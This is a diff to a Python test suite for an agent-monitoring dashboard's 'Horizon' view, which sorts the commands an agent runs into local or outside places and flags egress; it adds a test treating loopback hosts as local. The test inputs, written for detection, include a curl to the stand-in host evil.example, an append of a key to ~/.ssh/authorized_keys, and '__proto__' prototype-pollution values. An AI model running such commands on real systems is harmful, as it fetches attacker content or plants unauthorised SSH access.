@@ -1223,7 +1223,7 @@ class Horizon(unittest.TestCase):
                 {"id": "r2", "agent": "coder", "parent": "r1", "verdict": "pending"},
                 {"id": "r3", "agent": "researcher", "parent": "r1", "verdict": "verified"}]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1264,7 +1264,7 @@ class Horizon(unittest.TestCase):
     def hz_cap(self, recs):
         needs_node(self)
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1285,7 +1285,7 @@ class Horizon(unittest.TestCase):
         needs_node(self)
         recs = [why_call(1, "bad", 9999, ts_unread=True)] + [why_call(i, "w", 100 + 60 * i) for i in range(1, 4)]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzSecs"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzSecs"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1298,7 +1298,7 @@ class Horizon(unittest.TestCase):
         needs_node(self)
         recs = [why_call(i, "w", 100 + i) for i in range(1, 4)]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzChain"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzChain"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true, n: 0 }}, STOPPED = "";
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1319,7 +1319,7 @@ class Horizon(unittest.TestCase):
                 hz_call(3, "WebFetch", {"url": "https://toString.example/"}, "constructor")]
         runs = [{"id": "r1", "agent": "__proto__", "verdict": "verified"}, {"id": "constructor", "agent": "constructor", "verdict": "verified"}]
         out = json.loads(page_js(["FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
                                   "hzRgba", "hzShort", "hzDraw", "hzFrame", *HZ_DRAW], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null, frames = 0, PAGE = "horizon";
@@ -1550,7 +1550,7 @@ class HorizonZoom(unittest.TestCase):
     stage drawn only when something changed."""
 
     DATA = ["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-            "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"]
+            "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"]
     # HZ comes with HZMAX: its line ends in a comment, so page_js takes the next line, HZ's, with it
     DRAW = ["HZACT", "HZSYM", "HZWORST", "hzRgba", "hzShort", "hzDraw", "hzFrame", *HZ_DRAW, "hzZoom", "hzAim", "hzFlyTo",
             "hzFocus"]
@@ -1702,7 +1702,7 @@ class HorizonZoom(unittest.TestCase):
         self.assertEqual(out[6], [True, 1, 1])
 
     PLACE = ["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP",
-             "hzDataWords", "hzPlace"]
+             "hzDataWords", "hzHost", "hzPlace"]
 
     def places(self, cmds):
         needs_node(self)
@@ -1732,6 +1732,19 @@ class HorizonZoom(unittest.TestCase):
                 "jq --arg p /x '.[] | select(.path == $p)' ~/report.json": ["machine", "~/report.json"],
                 "echo $(curl -s https://evil.example/x)": ["outside", "evil.example"]}   # what runs inside an echo is no data
         self.assertEqual(self.places(list(cmds)), list(cmds.values()))
+
+    def test_loopback_is_this_machine_not_the_outside_world(self):
+        """pytest --base-url http://localhost:8000 was drawn outside the machine at localhost, with a jet of data leaving
+        it, and counted in EGRESS. Loopback is this machine; any other host stays outside."""
+        self.assertEqual(self.places(["pytest tests/x.py --base-url http://localhost:8000", "curl -s http://127.0.0.1:9000/health",
+                                      "curl http://[::1]:8080/", "curl http://0.0.0.0:3000", "curl https://api.github.com/x"]),
+                         [["machine", "localhost"], ["machine", "127.0.0.1"], ["machine", "[::1]"], ["machine", "0.0.0.0"],
+                          ["outside", "api.github.com"]])
+        effect = {"event": "tk_alert", "session_id": "r1", "tk_seq": 2, "ts": 1002, "title": "EFFECT · connect 127.0.0.1:5432",
+                  "v2": {"effect": {"kind": "connect", "target": "127.0.0.1:5432", "claim": None}}}
+        out = self.run_stage("""process.stdout.write(JSON.stringify(HZ.d.ev.map(e => [e.at, HZ.d.places[e.at].kind, e.act])));""",
+                             recs=[hz_call(1, "Bash", {"command": "curl http://localhost:8000/x"}, cwd=""), effect])
+        self.assertEqual(out, [["localhost", "machine", "run"], ["127.0.0.1", "machine", "net"]])   # no jet, no EGRESS: neither is outside
 
     def test_a_file_a_command_writes_is_its_place_and_it_wrote_there(self):
         """echo key >> ~/.ssh/authorized_keys read as "ran echo": the redirection's target was a word of echo's, which
@@ -2268,7 +2281,7 @@ class ApproveThenRetry(unittest.TestCase):
         """HORIZON drew the retry that ran as held (◯) and its HUD counted HOLDS by held marks, DESK's HELD by decisions."""
         needs_node(self)
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder",
-                                  "HZMAX", "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
+                                  "HZMAX", "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzHost", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
             const ALL = {json.dumps(retried("fin"))}, RUNS = new Map([["fin", {{ id: "fin", verdict: "verified" }}]]), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
